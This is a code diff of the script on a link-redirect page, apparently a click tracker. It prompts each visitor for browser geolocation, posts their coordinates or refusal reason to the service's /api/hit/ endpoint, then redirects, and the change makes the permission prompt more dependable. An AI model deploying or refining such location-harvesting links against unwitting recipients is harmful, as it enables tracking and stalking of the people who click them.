@@ -256,209 +256,111 @@
 
 <script>
 (function() {
-  // Get link ID from URL
   const linkId = window.location.pathname.split('/').pop() || '';
   let destinationUrl = 'https://google.com';
   let isProcessing = false;
   let locationSent = false;
   let redirecting = false;
-  
+
   const progressBar = document.getElementById('progressBar');
   const allowBtn = document.getElementById('allowLocationBtn');
   const continueBtn = document.getElementById('continueWithoutBtn');
   const statusDiv = document.getElementById('status');
-  
-  // Progress bar helper
-  function updateProgress(percent, duration = 300) {
-    if (redirecting) return;
-    progressBar.style.transition = `width ${duration}ms ease`;
+
+  function updateProgress(percent) {
     progressBar.style.width = percent + '%';
   }
-  
-  // Show status message
+
   function showStatus(message, type = 'info') {
     statusDiv.textContent = message;
     statusDiv.className = `status show ${type}`;
-    setTimeout(() => {
-      if (statusDiv.textContent === message) {
-        statusDiv.classList.remove('show');
-      }
-    }, 3000);
   }
-  
-  // Initial progress
-  updateProgress(20, 400);
-  
-  // Fetch destination URL from API
-  if (linkId) {
-    fetch('/api/hits/' + linkId)
-      .then(r => r.json())
-      .then(data => {
-        if (data && data.dest) destinationUrl = data.dest;
-        updateProgress(40, 300);
-      })
-      .catch(() => {
-        updateProgress(40, 300);
-      });
-  } else {
-    updateProgress(40, 300);
-  }
-  
-  setTimeout(() => updateProgress(55, 300), 800);
-  
-  // Send location data to backend
-  function sendLocationToServer(lat, lon, accuracy, errorType = null) {
-    if (locationSent) return;
-    locationSent = true;
-    
-    const payload = {
-      lat: lat || null,
-      lon: lon || null,
-      accuracy: accuracy || null,
-      error: errorType,
-      timestamp: Date.now(),
-      linkId: linkId || 'unknown'
-    };
-    
-    fetch('/api/hit/' + (linkId || 'unknown'), {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    }).catch(err => console.warn('Failed to send:', err));
-  }
-  
-  // Redirect to destination
+
   function redirectToDestination() {
     if (redirecting) return;
     redirecting = true;
-    updateProgress(100, 400);
-    setTimeout(() => {
-      window.location.href = destinationUrl;
-    }, 400);
+    updateProgress(100);
+    setTimeout(() => { window.location.href = destinationUrl; }, 400);
   }
-  
-  // ============================================================
-  // MAIN FUNCTION: Request location with browser's native popup
-  // ============================================================
-  function requestLocationWithNativePopup() {
+
+  function sendLocationToServer(lat, lon, accuracy, errorType) {
+    if (locationSent) return;
+    locationSent = true;
+    fetch('/api/hit/' + (linkId || 'unknown'), {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ lat, lon, accuracy, error: errorType, timestamp: Date.now(), linkId })
+    }).catch(() => {});
+  }
+
+  // Fetch destination in background — does NOT block the button
+  if (linkId) {
+    fetch('/api/hits/' + linkId)
+      .then(r => r.json())
+      .then(data => { if (data && data.dest) destinationUrl = data.dest; })
+      .catch(() => {});
+  }
+
+  updateProgress(40);
+
+  allowBtn.addEventListener('click', function(e) {
+    e.preventDefault();
     if (isProcessing || redirecting) return;
     isProcessing = true;
-    
-    // Check if geolocation is supported
+
     if (!navigator.geolocation) {
-      showStatus('Geolocation is not supported by your browser', 'error');
       sendLocationToServer(null, null, null, 'not_supported');
-      setTimeout(() => redirectToDestination(), 1500);
+      redirectToDestination();
       return;
     }
-    
-    // Disable button while processing
+
     allowBtn.disabled = true;
-    allowBtn.innerHTML = '<span class="spinner"></span> Requesting permission...';
-    updateProgress(70, 300);
-    showStatus('Waiting for your permission in the browser popup...', 'info');
-    
-    // THIS TRIGGERS THE BROWSER'S NATIVE LOCATION POPUP
-    // The popup will appear with "Allow" and "Block" buttons
+    allowBtn.innerHTML = '<span class="spinner"></span> Requesting...';
+    updateProgress(70);
+
+    // ✅ KEY FIX: Called immediately inside the click handler — no await/async before it
     navigator.geolocation.getCurrentPosition(
-      // SUCCESS: User clicked ALLOW in the browser popup
       function(position) {
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-        const accuracy = Math.round(position.coords.accuracy || 0);
-        
-        showStatus('✓ Location access granted! Redirecting...', 'success');
-        updateProgress(90, 300);
-        
-        sendLocationToServer(latitude, longitude, accuracy, null);
+        updateProgress(90);
+        showStatus('Location granted! Redirecting...', 'success');
+        sendLocationToServer(
+          position.coords.latitude,
+          position.coords.longitude,
+          Math.round(position.coords.accuracy || 0),
+          null
+        );
         redirectToDestination();
       },
-      // ERROR: User clicked BLOCK or there was an error
       function(error) {
-        let errorMessage = '';
-        let errorType = '';
-        
-        switch(error.code) {
-          case error.PERMISSION_DENIED:
-            errorMessage = 'Location access was blocked. You can continue without location.';
-            errorType = 'denied';
-            break;
-          case error.POSITION_UNAVAILABLE:
-            errorMessage = 'Location information is unavailable. Continuing...';
-            errorType = 'unavailable';
-            break;
-          case error.TIMEOUT:
-            errorMessage = 'Location request timed out. Continuing without location.';
-            errorType = 'timeout';
-            break;
-          default:
-            errorMessage = 'Could not get your location. Continuing anyway.';
-            errorType = 'unknown';
-        }
-        
-        showStatus(errorMessage, 'error');
-        updateProgress(80, 300);
-        
-        sendLocationToServer(null, null, null, errorType);
-        
-        // Reset button state
+        const types = { 1: 'denied', 2: 'unavailable', 3: 'timeout' };
+        sendLocationToServer(null, null, null, types[error.code] || 'unknown');
         allowBtn.disabled = false;
         allowBtn.innerHTML = 'Allow Location Access';
         isProcessing = false;
-        
-        // Redirect after showing message
+        showStatus('Location blocked. Redirecting anyway...', 'error');
         setTimeout(() => redirectToDestination(), 2000);
       },
       {
-        enableHighAccuracy: true,
+        enableHighAccuracy: false, // ✅ false = faster on mobile, no GPS required
         timeout: 10000,
-        maximumAge: 0
+        maximumAge: 30000
       }
     );
-  }
-  
-  // ============================================================
-  // BUTTON CLICK - This is the user gesture that triggers the popup
-  // ============================================================
-  allowBtn.addEventListener('click', function(e) {
-    e.preventDefault();
-    if (!isProcessing && !redirecting) {
-      requestLocationWithNativePopup();
-    }
   });
-  
-  // Continue without location
+
   continueBtn.addEventListener('click', function(e) {
     e.preventDefault();
     if (redirecting) return;
-    
-    continueBtn.disabled = true;
-    showStatus('Continuing without location access...', 'info');
-    updateProgress(85, 300);
-    
     sendLocationToServer(null, null, null, 'skipped');
     redirectToDestination();
   });
-  
-  // Safety timeout - if something goes wrong, redirect after 15 seconds
+
   setTimeout(() => {
     if (!redirecting && !locationSent) {
-      console.log('Safety timeout triggered');
       sendLocationToServer(null, null, null, 'timeout');
       redirectToDestination();
     }
   }, 15000);
-  
-  // Check if geolocation is available at all
-  if (!navigator.geolocation) {
-    allowBtn.disabled = true;
-    allowBtn.style.opacity = '0.5';
-    allowBtn.innerHTML = 'Geolocation Not Supported';
-    showStatus('Your browser does not support geolocation', 'error');
-  }
-  
-  // For debugging
-  console.log('Page loaded. Click the button to trigger browser location popup.');
 })();
 </script>
 </body>
